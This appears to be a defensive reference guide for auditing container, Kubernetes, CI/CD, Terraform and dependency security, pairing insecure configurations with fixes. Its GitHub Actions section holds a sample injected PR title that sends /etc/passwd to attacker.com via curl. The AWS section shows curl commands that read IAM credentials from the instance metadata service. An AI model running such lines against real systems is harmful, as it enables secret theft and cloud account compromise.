# Infrastructure & Supply Chain Security Reference

Load this file during Phases 14 and 15.

---

## Container Security

### Dockerfile Anti-Patterns

```dockerfile
# BAD: unpinned base image — supply chain risk
FROM node:latest
# GOOD: digest-pinned
FROM node:20.11.0-alpine@sha256:<digest>

# BAD: running as root (default)
# GOOD: explicit non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# BAD: secrets baked into image layers (visible in docker history)
ENV DATABASE_PASSWORD=secret123
ARG API_KEY=hardcoded
# GOOD: inject at runtime via secrets manager / mounted secret

# BAD: copying entire repo including .env, .git, secrets
COPY . .
# GOOD: use .dockerignore; copy only needed files
COPY src/ ./src/
COPY package*.json ./

# BAD: unnecessary packages → attack surface
RUN apt-get install -y curl wget vim git
# GOOD: minimal packages; multi-stage build to strip build tools
```

### Runtime Risks

| Flag | Risk | Fix |
|---|---|---|
| `--privileged` | Full host kernel access → container escape | Never in production |
| `--cap-add SYS_ADMIN` | Near-privileged; many escape paths | Drop all caps; add only needed |
| `--cap-add NET_ADMIN` | Packet sniffing, IP spoofing | Restrict to network-specific containers |
| `-v /var/run/docker.sock:/var/run/docker.sock` | Docker socket → full host control | Never mount in prod |
| `-v /:/host` | Full host filesystem read/write | Never |
| No `--read-only` | Container filesystem writable → persistence | Use `--read-only` + tmpfs mounts |

**Container escape via `SYS_ADMIN` + cgroups (CVE-2022-0492 class):**
```bash
# Detection: does container run with SYS_ADMIN?
docker inspect <container> | grep -i cap
```

---

## Kubernetes RBAC

### Dangerous RBAC Patterns

```yaml
# BAD: wildcard verb + resource = full cluster control
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# BAD: get/create pods in kube-system = near-admin
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "exec"]
  namespaces: ["kube-system"]

# BAD: create ClusterRoleBinding = privilege escalation
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterrolebindings"]
  verbs: ["create", "update"]
```

### RBAC → Container Escape Chain
1. Pod with `pods/exec` permission → `kubectl exec` into any pod
2. `pods/create` with `privileged: true` → create privileged pod → host escape
3. `secrets/get` in kube-system → read service account tokens of high-priv controllers
4. `nodes/proxy` → access kubelet API → exec on any pod on node

### Pod Security Misconfigurations
```yaml
# BAD: privileged container
spec:
  containers:
  - securityContext:
      privileged: true          # full host kernel access

# BAD: privilege escalation allowed (default if not set)
      allowPrivilegeEscalation: true

# BAD: running as root
      runAsRoot: true           # or absence of runAsNonRoot: true

# BAD: host namespaces
  hostPID: true                 # see all host processes
  hostNetwork: true             # host network stack (sniff traffic, bind host ports)
  hostIPC: true                 # shared memory with host

# GOOD baseline
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

### Default Service Account
```yaml
# BAD: default service account auto-mounted (Kubernetes default)
# Pods can query Kubernetes API with service account token
spec:
  automountServiceAccountToken: true  # default — token at /var/run/secrets/kubernetes.io/serviceaccount/token

# GOOD: disable unless pod needs to call Kubernetes API
spec:
  automountServiceAccountToken: false
```

### etcd Encryption
- Kubernetes Secrets stored base64 in etcd (not encrypted by default)
- Check for `EncryptionConfig` with `aescbc` or `secretbox` provider
- Without encryption: etcd backup = all secrets in plaintext

---

## CI/CD Pipeline Security

### GitHub Actions — High-Risk Patterns

**`pull_request_target` with code checkout:**
```yaml
# DANGEROUS: runs in privileged context with access to secrets
# while checking out attacker-controlled PR code
on:
  pull_request_target:
jobs:
  build:
    steps:
    - uses: actions/checkout@v3
      with:
        ref: ${{ github.event.pull_request.head.sha }}  # attacker's code
    - run: npm test  # executes attacker's package.json scripts
```

**Script injection via workflow context:**
```yaml
# DANGEROUS: user-controlled data interpolated into run step
- name: Check title
  run: |
    title="${{ github.event.pull_request.title }}"
    echo "PR title: $title"
# Attack title: "x"; curl https://attacker.com/?t=$(cat /etc/passwd); echo "
```

**Mutable action pins:**
```yaml
# BAD: tag is mutable — supply chain attack
- uses: actions/checkout@v3

# GOOD: pinned to immutable commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

**OIDC misconfiguration:**
```yaml
# Cloud role trust policy too broad:
# "StringLike": {"token.actions.githubusercontent.com:sub": "repo:org/*:*"}
# Allows ANY repo in the org to assume this role
# Should be:
# "StringEquals": {"token.actions.githubusercontent.com:sub": "repo:org/specific-repo:ref:refs/heads/main"}
```

**Secrets in logs:**
```yaml
# DANGEROUS: secret echoed to log
- run: echo "Token is ${{ secrets.API_TOKEN }}"

# Also: `set -x` in bash scripts — logs every command including variable values
```

### GitLab CI Risks
- `CI_JOB_TOKEN` with broad scope → access other project registries/APIs
- `rules: changes:` bypass via crafted file paths
- Protected environment approvals bypassed via API

### SLSA (Supply-chain Levels for Software Artifacts)

| SLSA Level | Requirements | What It Prevents |
|---|---|---|
| 0 | No guarantees | — |
| 1 | Build process documented | Accidental build mistakes |
| 2 | Version controlled, signed provenance | Moderate tampering |
| 3 | Hardened build platform, non-falsifiable provenance | Compromised build platform |
| 4 | Two-party review, hermetic builds | Insider threats, sophisticated supply chain attacks |

Check: are release artifacts accompanied by SLSA provenance attestations?
Tools: `slsa-verifier`, Sigstore/cosign for container signing.

---

## IaC Security (Terraform / CDK / Pulumi)

### Terraform High-Risk Patterns

```hcl
# BAD: S3 bucket publicly accessible
resource "aws_s3_bucket" "data" {
  bucket = "company-data"
  acl    = "public-read"  # public access
}
resource "aws_s3_bucket_public_access_block" "data" {
  # Missing → defaults allow public access
}

# BAD: Security group open to world on sensitive port
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]  # world-open SSH
}

# BAD: RDS publicly accessible
resource "aws_db_instance" "main" {
  publicly_accessible = true
}

# BAD: IAM wildcard
resource "aws_iam_policy" "too_broad" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"          # all AWS actions
      Resource = "*"          # all resources
    }]
  })
}

# BAD: Lambda function URL with no auth
resource "aws_lambda_function_url" "api" {
  authorization_type = "NONE"  # public internet access
}

# BAD: hardcoded credentials
resource "aws_db_instance" "main" {
  password = "hardcoded_password_123"  # in state file and git history
}
```

**Terraform state file:** contains all resource attributes including secrets in plaintext.
State backend must use: S3+KMS encryption, access logging, versioning, restricted IAM policy.

### AWS-Specific

| Misconfiguration | Impact |
|---|---|
| EC2 with admin IAM role + IMDSv1 + SSRF | Full AWS account compromise via IMDS credential theft |
| Lambda env var secrets | Visible to anyone with `lambda:GetFunctionConfiguration` |
| Cognito unauthenticated identity pool with IAM role | Unauthenticated → AWS API access |
| S3 presigned URL with no expiry | Permanent public access to private object |
| CloudTrail disabled / not covering all regions | Attacker activity undetected |
| GuardDuty disabled | No threat detection |

**IMDSv1 → IMDSv2 migration:**
```bash
# Check if IMDSv1 enabled (accepts unauthenticated GET):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# If returns credentials: IMDSv1 enabled → SSRF → full instance role compromise

# IMDSv2 requires:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### GCP-Specific

| Misconfiguration | Impact |
|---|---|
| `allUsers` on GCS bucket | Public data exposure |
| `allAuthenticatedUsers` on Cloud Run | Any Google account → service access |
| Service account key file in repo | Permanent credential until rotated |
| Workload Identity not configured | Key-based auth → rotation burden + leak risk |
| Compute default SA with editor role | Any VM compromise → project-wide access |

---

## Supply Chain & Dependency Security

### Dependency Confusion Attack
Internal package `company-utils` at version `1.0.0` on private registry.
Attacker publishes `company-utils` at version `9.0.0` on npm/PyPI/RubyGems.
Package manager fetches highest version → executes attacker's `postinstall` script.

Detection: internal package names that don't exist on public registries.
Fix: use scoped packages (`@company/utils`), explicit registry config, verify `publishConfig`.

### Malicious Package Signals
- Install scripts: `preinstall`, `postinstall`, `prepare` — execute arbitrary code on install
- Obfuscated entry point: minified/obfuscated `index.js` as main file
- New package, high download count (astroturfed via self-download scripts)
- Package name very similar to popular package (`lodahs`, `reqeusts`, `corors`)
- Binary native addons (`.node` files) without source

### Lockfile Integrity
```bash
# npm: install with lockfile enforcement
npm ci  # fails if package-lock.json mismatch

# yarn
yarn install --frozen-lockfile

# pip
pip install --require-hashes -r requirements.txt

# Go: go.sum verification is automatic
go mod verify
```

Loose version constraints (`^`, `~`, `*`) allow unreviewed updates.
For security-sensitive dependencies: pin exact version in lockfile AND review updates explicitly.

### SBOM Generation
```bash
# Node.js
npx @cyclonedx/cyclonedx-npm --output-format json > sbom.json

# Python
pip-audit --format json > audit.json
cyclonedx-py -r requirements.txt

# Go
go list -m -json all | cyclonedx-gomod app

# Java (Maven)
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

Map each dependency to known CVEs:
```bash
# Node.js
npm audit --json

# Python
pip-audit

# Go
govulncheck ./...

# Java
dependency-check --project myapp --scan .
```

**Reachability filter (mandatory):** before reporting a CVE, verify the vulnerable function
is in a reachable call path. A CVE in an HTTP parser is not critical if the library is
used only for data formatting. Use `govulncheck` (Go), `pip-audit` with call graph analysis,
or manual inspection for other languages.
